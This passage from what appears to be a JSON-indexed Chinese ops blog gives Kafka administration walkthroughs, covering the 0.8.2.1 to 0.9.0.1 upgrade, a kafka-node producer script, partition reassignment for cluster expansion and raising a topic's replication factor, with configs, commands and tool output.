/home/iteblog/.ivy2/local/org.scala-sbt/collections/0.13.0/jars/collections.jar :::::::::::::::::::::::::::::::::::::::::::::: :: FAILED DOWNLOADS :: :: ^ see resolution messages for details ^ :: :::::::::::::::::::::::::::::::::::::::::::::: :: org.scala-sbt#collections;0.13.0!collections.jar :::::::::::::::::::::::::::::::::::::::::::::: 我们可以手动地下载相关依赖，并放到类似/home/iteblog/.ivy2/local/org.scala-sbt/collections/0.13.0/jars/目录下面。然后再编译就可以了。 最后，我们可以通过下面命令启动Kafka Web Console监控系统： 1# sbt run 并可以在http://localhost:9000 查看下面是一张效果图 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/05/25/Bigdata-hadoop/Kafka/Bigdata-开源的Kafka集群管理器(kafka-web-console)/"},{"title":"KafKa从0.8.2.1升级到0.9.0.1变化方案与步骤","text":"🍊我这里是采用,群集升级,全部更新停止老版本zk和kafka更新服务。 9.0.0有潜在的中断更改风险（在升级之前需要知道），并且与之前版本的broker之间的协议改变。这意味着此次升级可能和客户端旧版本不兼容。因此在升级客户端之前，先升级kafka集群。如果你使用MirrorMaker下游集群，则同样应首先升级。 滚动升级123升级所有broker的server.properties,并在其中添加inter.broker.protocol.version = 0.8.2.X每次升级一个broker：关闭broker，替换新版本，然后重新启动。 群集升级一旦整个群集升级，通过编辑inter.broker.protocol.version并将其设置为0.9.0.0来转换所有协议。逐个重新启动broker，使新协议版本生效。注意 ：如果你可接受停机，你可以简单地将所有broker关闭，更新版本并重启启动，协议将默认从新版本开始。注意 ：变换协议版本和重启启动可以在broker升级完成后的任何时间去做，不必马上做。 0.9.0.0潜在的中断变化123456789101112131415161718192021222324Java 1.6不再支持，需要Jdk1.7版本以上。Scala 2.9不再支持。默认情况下，1000以上的Broker ID为自动分配。如果你的集群高于该阈值，需相应地增加reserved.broker.max.id配置。replica.lag.max.messages配置已经移除。分区leader在决定哪些副本处于同步时将不再考虑落后的消息的数。配置参数replica.lag.time.max.ms现在不仅指自上次从副本获取请求后经过的时间，还指自副本上次被捕获以来的时间。 副本仍然从leader获取消息，但超过replica.lag.time.max.ms配置的最新消息将被认为不同步的。压缩的topic不再接受没有key的消息，如果出现，生产者将抛出异常。 在0.8.x中，没有key的消息将导致日志压缩线程退出（并停止所有压缩的topic）。MirrorMaker不再支持多个目标集群。 它只接受一个--consumer.config。 要镜像多个源集群，每个源集群至少需要一个MirrorMaker实例，每个源集群都有自己的消费者配置。在org.apache.kafka.clients.tools。包下的Tools已移至org.apache.kafka.tools。。 所有包含的脚本仍将照常工作，只有直接导入这些类的自定义代码将受到影响。在kafka-run-class.sh中更改了默认的Kafka JVM性能选项（KAFKA_JVM_PERFORMANCE_OPTS）。kafka-topics.sh脚本（kafka.admin.TopicCommand）现在退出，失败时出现非零退出代码。kafka-topics.sh脚本（kafka.admin.TopicCommand）现在将在topic名称由于使用“.”或“_”而导致风险度量标准冲突时打印警告。以及冲突的情况下的错误。kafka-console-producer.sh脚本（kafka.tools.ConsoleProducer）将默认使用新的Java Producer，用户必须指定“old-producer”才能使用旧生产者。默认情况下，所有命令行工具都会将所有日志消息打印到stderr而不是stdout。 0.9.0.1中的显著变化123456可以通过将broker.id.generation.enable设置为false来禁用新的broker ID生成功能。默认情况下，配置参数log.cleaner.enable为true。 这意味着topic会清理。policy = compact现在将被默认压缩，并且128MB的堆（通过log.cleaner.dedupe.buffer.size）分配给清洗进程。你可能需要根据你对压缩topic的使用情况，查看log.cleaner.dedupe.buffer.size和其他log.cleaner配置值。默认情况下，新消费者的配置参数fetch.min.bytes的默认值为1。 0.9.0.0弃用的1234567kafka-topics.sh脚本的变更topic配置已弃用（kafka.admin.ConfigCommand），以后将使用kafka-configs.sh(kafka.admin.ConfigCommand) 。kafka-consumer-offset-checker.sh(kafka.tools.ConsumerOffsetChecker)已弃用，以后将使用kafka-consumer-groups.sh (kafka.admin.ConsumerGroupCommand)kafka.tools.ProducerPerformance已弃用。以后将使用org.apache.kafka.tools.ProducerPerformance（kafka-producer-perf-test.sh也将使用新类）生产者的block.on.buffer.full已弃用，并将在以后的版本中移除。目前其默认已经更为false。KafkaProducer将不再抛出BufferExhaustedException，而是使用max.block.ms来中止，之后将抛出TimeoutException。如果block.on.buffer.full属性明确地设置为true，它将设置max.block.ms为Long.MAX_VALUE和metadata.fetch.timeout.ms将不执行。 升级准备步骤：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667（0）wget http://mirror.bit.edu.cn/apache/kafka/0.9.0.1/kafka_2.10-0.9.0.1.tgztar -xvf kafka_2.10-0.9.0.1.tgz[jollybi@kafka1 tools]$ lltotal 88100drwxr-xr-x 7 jollybi jollybi 4096 Jul 14 13:07 kafka_2.10-0.8.2.1-rw-rw-r-- 1 jollybi jollybi 16162559 Jul 14 11:40 kafka_2.10-0.8.2.1.tgzdrwxr-xr-x 6 jollybi jollybi 4096 Feb 12 2016 kafka_2.10-0.9.0.1-rw-rw-r-- 1 jollybi jollybi 35725063 Jun 20 20:11 kafka_2.10-0.9.0.1.tgzdrwxr-xr-x 12 jollybi jollybi 4096 Sep 25 16:41 zookeeper-3.4.5-rw-rw-r-- 1 jollybi jollybi 38307840 Jul 14 11:40 zookeeper-3.4.5.tar[jollybi@kafka1 tools]$ mkdir -p /data/tools/kafka_2.10-0.9.0.1/kafka-logs[jollybi@kafka1 tools]$ mkdir -p /data/tools/kafka_2.10-0.9.0.1/logs###修改配置：(1)[jollybi@kafka1 tools]$ vim kafka_2.10-0.9.0.1/config/zookeeper.properties第一步修改:# the directory where the snapshot is stored.dataDir=dataDir=/data/jollybi/tools/zookeeper-3.4.5/tmp# the port at which the clients will connectclientPort=2281# disable the per-ip limit on the number of connections since this is a non-production configmaxClientCnxns=0dataDir,clientPort的意义不需要说明了，对于maxClientCnxns选项，如果不设置或者设置为0，则每个ip连接zookeeper时的连接数没有限制。需要注意的是，设置maxClientCnxns的值时需要把kafka server的连接数考虑进去，因为启动kafka server时，kafka server也会连接zookeeper的。(2)[jollybi@kafka1 tools]$ vim kafka_2.10-0.9.0.1/config/consumer.propertieszookeeper.connect=10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281其他参数根据不同集群环境调整(3)[jollybi@kafka1 tools]$ vim kafka_2.10-0.9.0.1/config/producer.properties (修改内网IP)metadata.broker.list=10.155.90.153:9292,10.155.90.155:9292,10.155.90.138:9292producer.type=synccompression.codec=noneserializer.class=kafka.serializer.DefaultEncoder其他参数根据不同集群环境调整(4) [jollybi@kafka1 config]$ cat server.properties | grep -Pv \"^#|^$\"broker.id=1auto.leader.rebalance.enable = truelisteners=PLAINTEXT://10.155.90.153:9292port=9292host.name=10.155.90.153zookeeper.connect=10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281zookeeper.connection.timeout.ms=6000num.network.threads=3num.io.threads=8socket.send.buffer.bytes=102400socket.receive.buffer.bytes=102400socket.request.max.bytes=104857600log.dirs=/data/tools/kafka_2.10-0.9.0.1/kafka-logslog.cleaner.enable=truedelete.topic.enable=truenum.partitions=1num.recovery.threads.per.data.dir=1log.retention.hours=96log.segment.bytes=1073741824log.retention.check.interval.ms=300000备注：listeners一定要配置成为IP地址；如果配置为localhost或服务器的hostname,在使用java发送数据时就会抛出异 常：org.apache.kafka.common.errors.TimeoutException: Batch Expired 。因为在没有配置advertised.host.name 的情况下，Kafka并没有像官方文档宣称的那样改为广播我们配置的hostname，而是广播了主机配置的hostname。远端的客户端并没有配置 hosts，所以自然是连接不上这个hostname的 kafka与zk内存日志优化我个人博客有写优化文档Bigdata-Zookeeper集群日志配置详解和清理自定义启动内存Kafka性能优化–JVM参数配置优化Kafka日志存储解析与实践数据存储优化 升级步骤方案：1234567891011121314151617(0) mongodb 能存储时间戳4个小时的数据，在4个小时之内升级不会有风险。(1) mongotail 先停止生产写入数据到kafka(2) kafka 消费组继续消费 topic分区查看消费为零。(3) zk需要升级3.4.6版本对应kafka0.9.1版本，如果zk不需要升级，升级之前要先将ZooKeeper中原版本的kafka生成的znode删除，包括：consumers, controller, brokers, controller_epoch等。否则启动kafka会报错。(4) 重启新版本zk集群，查看集群服务选举是否正常。(5) 重启新版本kafka集群，重启没有报错，查看版本没问题就行。(6) zk上面查看命令 ./zkCli.sh -server 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281[zk: 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281(CONNECTED) 0] ls /controller_epoch controller brokers zookeeper kafka-manager admin isr_change_notification consumers config[zk: 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281(CONNECTED) 0] ls /brokers/ids[1, 2, 3] 集群三个brokers id正常(7)修改监控指标。 完成升级(8) 另外，新版本的一些命令与原版本的有些相同,增删改查命令。 开始升级步骤操作：123456789101112131415161718192021222324252627282930313233343536373839404142434445（1)启动zk与kafka# /data/tools/zookeeper-3.4.6/bin/zkServer.sh start# /data/tools/kafka_2.10-0.9.0.1/bin/kafka-server-start.sh /data/tools/ kafka_2.10-0.9.0.1/config/server.properties &amp;（2）新建topic#./bin/kafka-topics.sh --create --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --replication-factor 3 --partitions 12 --topic mongotail_lz4_imp #./bin/kafka-topics.sh --create --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --replication-factor 3 --partitions 12 --topic mongotail_lz4(3) 查看集群topic分区情况#./bin/kafka-topics.sh --describe --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --topic mongotail_lz4(4) 更新所有开源监控（KafkaOffsetMonitor）vim /home/jollybi/./monitor/monitor.sh#!/bin/bashjava -Xms512M -Xmx512M -Xss1024K -XX:PermSize=256m -XX:MaxPermSize=512m -cp KafkaOffsetMonitor-assembly-0.2.0_modify.jar com.quantifind.kafka.offsetapp.OffsetGetterWeb --zk 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --port 8086 --refresh 10.seconds --retain 7.days &gt;/tmp/stdout.log 2&gt;&amp;1 &amp;zk地址修改成内网地址 这里的数据存储7天。重启服务：./monitor/monitor.sh &amp;（5）更新开源监控（kafka-manager）vim kafka-manager-1.3.3.8/conf/application.confkafka-manager.zkhosts=\"10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281\"zk地址修改成内网地址.重启服务：./kafka-manager-1.3.3.8/bin/kafka-manager -Dconfig.file=kafka-manager-1.3.3.8/conf/application.conf -Dhttp.port=8080 &amp;（6）更新开源监控（zabbix）自己写的监控脚本[jollybi@kafka1 ~]$ /data/tools/kafka_2.10-0.9.0.1/bin/kafka-run-class.sh kafka.tools.ConsumerOffsetChecker --zookeepe 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --group group_ml --topic mongotail_lz4[2017-10-31 14:05:24,390] WARN WARNING: ConsumerOffsetChecker is deprecated and will be dropped in releases following 0.9.0. Use ConsumerGroupCommand instead. (kafka.tools.ConsumerOffsetChecker$)Group Topic Pid Offset logSize Lag Ownergroup_ml mongotail_lz4 0 1205186 1205257 71 group_ml_Graphsql-test.jollychic.com-1509421110787-1daec53a-0group_ml mongotail_lz4 1 1206860 1206915 55 group_ml_Graphsql-test.jollychic.com-1509421110787-1daec53a-0....运行会出现WARN警告，0.9版本更新过了，注意：在0.9.0.0，kafka.tools.ConsumerOffsetChecker已经不支持了。你应该使用kafka.admin.ConsumerGroupCommand(或bin/kafka-consumer-groups.sh脚本)来管理消费者组，包括用新消费者API创建的消费者。这里使用kafka.admin.ConsumerGroupCommand 提示命令不对，现在在研究使用。 监控脚本 输出会有提示直接过滤掉即可。function wlj_event_lag &#123;echo \"`sh /etc/zabbix/kafka_topic_monitor.sh 2&gt;/dev/null | sed -n '3p'`\"&#125; 🎉 kafka升级，调配内网访问地址，内存，日志输出类型调优，监控更新配置。🎉 参考官网文档 Apache Kafka 从 0.8.0, 0.8.1.X 或 0.8.2.X 升级到 0.9.0.0 Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/11/04/Bigdata-hadoop/Kafka/KafKa从0.8.2.1升级到0.9.0.1变化方案与步骤/"},{"title":"Bigdata-Kafka-node模块实现调用js发送数据","text":"mongodb写到kafka 指定topic消费。为了保证数据稳定可靠性。配合大数据在countly 使用开源Kafka-node是一个Node.js客户端 写js程序让countly三台集群分别数据到kafka 做新的topic主题备份。 1npm install kafka-node 进入kafka-node目录: vim kafka_test.js 123456789101112131415161718192021222324252627282930313233343536373839404142var kafka = require('kafka-node'),HighLevelProducer = kafka.HighLevelProducer, //Producer = kafka.Producer, client = new kafka.Client('169.44.62.139:2281,169.44.59.138:2281,169.44.62.137:2281'), //producer = new Producer(client);producer = new HighLevelProducer(client);console.log('连接kafka中');var argv = &#123; topic: \"test1\"&#125;;var topic = argv.topic || 'test1';var p = argv.p || 0;var a = argv.a || 0;var producer = new HighLevelProducer(client, &#123; requireAcks: 1, partitionerType: 3&#125;);console.log(producer);producer.on('ready', function() &#123; var args = &#123; appid: '222-wx238c28839a133d0e', createTime: '222-ddd', toUserName: '222-wx238c28839a133d0e', fromUserName: '222-wx238c28839a133d0e' &#125;; producer.send([&#123; topic: topic, partition: p, messages: [JSON.stringify(args)], attributes: a &#125;], function(err, result) &#123; console.log(err || result); process.exit(); &#125;); console.log(args);&#125;); 官网地址：https://www.npmjs.com/package/kafka-node#install-kafka交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/08/01/Bigdata-hadoop/Kafka/Kafka-node模块实现调用js发送数据/"},{"title":"KafKa动态扩容群集-(Topic.partitions迁移)","text":"kafka的扩容难点：1）主要在于增加机器之后，数据需要rebalance到新增的空闲节点，即把partitions迁移到空闲机器上。kafka提供bin/kafka-reassign-partitions.sh工具，完成parttition的迁移。 2）kafka的集群的数据量加大，数据rebalance的时间较长。解决办法是把log.retention.hours=1设置一小时（生产参数24小时）。修改参数之后，重启kakfa节点，kafka会主动purge 1小时之前的log数据。以下是kafka_0.8.1.1版本kafkka集群扩容操作记录，从3台物理机扩容到4台物理，partition数量由24个增加到28个。 参考：http://kafka.apache.org/081/documentation.html#basic_ops_modify_topic kafka的复制副本：将服务器添加到Kafka集群非常简单，只需为其分配唯一的代理ID，然后在新服务器上启动Kafka。但是，这些新的服务器不会自动分配任何数据分区，除非将分区移动到这些分区，否则直到创建新主题时才会执行任何工作。所以通常当你将机器添加到你的群集中时，你会想把一些现有的数据迁移到这些机器上。数据迁移过程是手动启动的，但是完全自动化。下面介绍的是，Kafka会将新服务器添加为正在迁移的分区的跟随者，并允许其完全复制该分区中的现有数据。当新服务器完全复制了此分区的内容并加入了同步副本时，其中一个现有副本将删除其分区的数据。 分区重新分配工具可用于跨代理移动分区。理想的分区分布将确保所有代理的数据加载和分区大小。分区重新分配工具不具备自动研究Kafka集群中的数据分布并移动分区以实现均匀负载分配的功能。因此，管理员必须找出哪些主题或分区应该移动。 分区重新分配工具可以运行在3个互斥的模式中： 12345--生成：在此模式下，给定主题列表和经纪人列表，该工具会生成候选重新​​分配，以将指定主题的所有分区移至新经纪人。此选项仅提供了一种便捷的方式，可以根据主题和目标代理列表生成分区重新分配计划。--execute：在此模式下，该工具根据用户提供的重新分配计划启动分区重新分配。（使用--reassignment-json-file选项）。这可以是由管理员制作的自定义重新分配计划，也可以是使用--generate选项提供的自定义重新分配计划。--verify：在此模式下，该工具会验证上次执行过程中列出的所有分区的重新分配状态。状态可以是成功完成，失败或正在进行 自动将数据迁移到新机器 分区重新分配工具可用于将当前一组经纪人的一些主题移到新增的经纪人。这在扩展现有集群时通常很有用，因为将整个主题移动到新的代理集比移动一个分区更容易。用于这样做时，用户应该提供应该移动到新的经纪人集合和新的经纪人的目标列表的主题列表。然后，该工具在新的代理集合上均匀分配给定主题列表的所有分区。在此过程中，主题的复制因子保持不变。有效地，主题输入列表的所有分区副本都从旧的代理集合移动到新添加的代理。例如，以下示例将把主题countly_apppush，countly_event...的所有分区移动到新的代理集4 。在本次移动结束时，主题countly_apppush，countly_event...的所有分区将仅存在于代理4上。 1.kafka 扩容首先按照搭建步骤，在其他机器上搭建集群，kafka的配置文件中 zkconnect 要保持与原kafka一致kafka版本一致，配置跟之前kafka集群一致，只需要修改本地kafka的地址. 2.验证kafka新节点是否加入集群成功，这个应该去zookeeper的zkCli.sh 去查看123[root@kafka1 bin]# ./zkCli.sh -server 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281[zk: 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281(CONNECTED) 0] ls /brokers/ids/1,2,3,4 3.由于该工具接受主题的输入列表作为json文件，因此首先需要确定要移动的主题并创建json文件，如下所示：1234567891011&#123;\"topics\": [&#123;\"topic\": \"countly_apppush\"&#125;, &#123;\"topic\": \"countly_event\"&#125;, &#123;\"topic\": \"countly_imp\"&#125;, &#123;\"topic\": \"countly_metrics\"&#125;, &#123;\"topic\": \"countly_pv\"&#125;, &#123;\"topic\": \"countly_session\"&#125;, &#123;\"topic\": \"mongotail_lz4\"&#125;, &#123;\"topic\": \"mongotail_lz4_imp\"&#125; ], \"version\":1&#125; 4.一旦json文件准备就绪，使用分区重新分配工具来生成候选分配：12345678910111213bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --topics-to-move-json-file topics-to-move.json --broker-list \"1,2,3,4\" --generate[jollybi@kafka3 kafka_2.10-0.9.0.1]$ bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --topics-to-move-json-file topics-to-move.json --broker-list \"1,2,3,4\" --generateCurrent partition replica assignment&#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"countly_metrics\",\"partition\":7,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":6,\"replicas\":[1]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":8,\"replicas\":[3,2,1]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":0,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":5,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":8,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"countly_apppush\",\"partition\":0,\"replicas\":[2,3,1]&#125;,&#123;\"topic\":\"countly_session\",\"partition\":8,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":9,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"countly_metrics\",\"partition\":2,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"countly_session\",\"partition\":4,\"replicas\":[3,1,2]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":4,\"replicas\":[2,3,1]&#125;,&#123;\"topic\":\"countly_apppush\",\"partition\":6,\"replicas\":[2,3,1]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":11,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":3,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"countly_metrics\",\"partition\":4,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"countly_metrics\",\"partition\":8,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":10,\"replicas\":[3,2,1]&#125;,.....Proposed partition reassignment configuration&#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"countly_event\",\"partition\":6,\"replicas\":[3]&#125;,&#123;\"topic\":\"countly_metrics\",\"partition\":7,\"replicas\":[4,2,3]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":8,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":0,\"replicas\":[2,3,4]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":5,\"replicas\":[3,4,1]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":8,\"replicas\":[2,4,1]&#125;,&#123;\"topic\":\"countly_apppush\",\"partition\":0,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":9,\"replicas\":[3,1,2]&#125;,&#123;\"topic\":\"countly_session\",\"partition\":8,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"countly_metrics\",\"partition\":2,\"replicas\":[3,4,1]&#125;,&#123;\"topic\":\"countly_session\",\"partition\":4,\"replicas\":[1,4,2]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":4,\"replicas\":[2,4,1]&#125;,&#123;\"topic\":\"countly_apppush\",\"partition\":6,\"replicas\":[3,1,2]&#125;,&#123;\"topic\":\"countly_imp\",\"partition\":11,\"replicas\":[1,3,4]&#125;,&#123;\"topic\":\"countly_pv\",\"partition\":3,\"replicas\":[1,2,3]&#125;...... 其中的Current partition replica assignment指的是迁移前的partition replica；Proposed partition reassignment configuration 指的就是迁移分配规则json。需要将该[Proposed partition reassignment configuration]json文件保存到json文件中(如expand-cluster-reassignment.json) 该工具会生成一个候选分配，将所有分区从主题countly_apppush，countly_event...移动到brokers 1,2,3,4但是，请注意，在这一点上，分区运动还没有开始，它只是告诉你当前的任务和建议的新任务。应该保存当前的分配，以防你想要回滚到它。新的任务应该保存在一个json文件中（例如expand-cluster-reassignment.json），并用--execute选项输入到工具中，如下所示: 1234567891011121314151617181920212223242526272829303132./bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file expand-cluster-reassignment.json --executeCurrent partition replica assignment&#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":9,\"replicas\":[2,3,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":7,\"replicas\":[3,2,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":6,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":5,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":8,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":2,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":1,\"replicas\":[3,2,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":4,\"replicas\":[3,1,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":0,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":10,\"replicas\":[3,1,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":3,\"replicas\":[2,3,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":11,\"replicas\":[1,2,3]&#125;]&#125;Save this to use as the --reassignment-json-file option during rollbackSuccessfully started reassignment of partitions &#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":3,\"replicas\":[3,4,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":8,\"replicas\":[4,3,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":0,\"replicas\":[4,1,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":6,\"replicas\":[2,4,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":11,\"replicas\":[3,2,4]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":1,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":10,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":4,\"replicas\":[4,2,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":9,\"replicas\":[1,4,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":2,\"replicas\":[2,3,4]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":5,\"replicas\":[1,3,4]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":7,\"replicas\":[3,1,2]&#125;]&#125;``` 最后，可以使用`--verify`选项来检查分区重新分配的状态。请注意，相同的`expand-cluster-reassignment.json`（与`--execute`选项一起使用）应该与--verify选项一起使用```BASH/bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file expand-cluster-reassignment.json --verify[jollybi@kafka4 kafka_2.10-0.9.0.1]$ ./bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file expand-cluster-reassignment.json --verifyStatus of partition reassignment:Reassignment of partition [countly_event,2] completed successfullyReassignment of partition [countly_session,7] completed successfullyReassignment of partition [countly_pv,5] completed successfullyReassignment of partition [countly_apppush,1] completed successfullyReassignment of partition [countly_event,0] completed successfullyReassignment of partition [countly_session,10] completed successfullyReassignment of partition [countly_apppush,4] completed successfullyReassignment of partition [countly_event,7] is still in progressReassignment of partition [countly_metrics,7] completed successfullyReassignment of partition [countly_imp,4] is still in progressReassignment of partition [countly_apppush,10] completed successfullyReassignment of partition [countly_imp,5] is still in progress..... 注意：在迁移过程中不能人为的结束或停止kafka服务，不然会有数据不一致的问题. Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/07/11/Bigdata-hadoop/Kafka/KafKa扩容群集(Topic.partitions迁移)/"},{"title":"Kafka动态增加Topic的副本(Replication)","text":"Kafka动态增加Topic的副本(Replication)当前我的topic ：countly_event 只有1个副本，如果集群其中一台机器出现问题，就会丢失数据。所以这里以后新建新的topic 最少2个副本，如果资源非常充足可以考虑副本3个。 1234567891011121314[jollybi@kafka1 kafka_2.10-0.9.0.1]$ ./bin/kafka-topics.sh --zookeeper 172.31.2.6:2182,172.31.2.7:2182,172.31.2.8:2182 -describe -topic countly_eventTopic:countly_event PartitionCount:12 ReplicationFactor:1 Configs: Topic: countly_event Partition: 0 Leader: 1 Replicas: 1 Isr: 1 Topic: countly_event Partition: 1 Leader: 2 Replicas: 2 Isr: 2 Topic: countly_event Partition: 2 Leader: 3 Replicas: 3 Isr: 3 Topic: countly_event Partition: 3 Leader: 4 Replicas: 4 Isr: 4 Topic: countly_event Partition: 4 Leader: 1 Replicas: 1 Isr: 1 Topic: countly_event Partition: 5 Leader: 2 Replicas: 2 Isr: 2 Topic: countly_event Partition: 6 Leader: 3 Replicas: 3 Isr: 3 Topic: countly_event Partition: 7 Leader: 4 Replicas: 4 Isr: 4 Topic: countly_event Partition: 8 Leader: 1 Replicas: 1 Isr: 1 Topic: countly_event Partition: 9 Leader: 2 Replicas: 2 Isr: 2 Topic: countly_event Partition: 10 Leader: 3 Replicas: 3 Isr: 3 Topic: countly_event Partition: 11 Leader: 4 Replicas: 4 Isr: 4 增加现有分区的复制因子很容易。只需在自定义重新分配json文件中指定额外副本，并将其与–execute选项一起使用即可增加指定分区的复制因子。 例如，以下示例将主题countly_event的分区0的复制因子从1增加到3.在增加复制因子之前，该分区的唯一副本存在于代理1上。作为增加复制因子的一部分，我们将添加更多副本经纪人2和3和4。 第一步是在json文件中手工制作自定义重新分配计划 - 这个自己定义每个分区设置副本，例如：0分区设置在3和2和4. 123456789101112131415&#123;\"version\":1, \"partitions\": [&#123;\"topic\":\"countly_event\",\"partition\":0,\"replicas\":[3,2,4]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":1,\"replicas\":[3,2,4]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":2,\"replicas\":[4,3,1]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":3,\"replicas\":[2,1,3]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":4,\"replicas\":[3,4,1]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":5,\"replicas\":[4,1,2]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":6,\"replicas\":[1,2,3]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":7,\"replicas\":[2,3,4]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":8,\"replicas\":[3,1,2]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":9,\"replicas\":[4,2,3]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":10,\"replicas\":[1,3,4]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":11,\"replicas\":[2,4,1]&#125;] &#125; 然后，使用带有–execute选项的json文件启动重新分配过程 12345678910 ./bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file increase-replication-factor.json 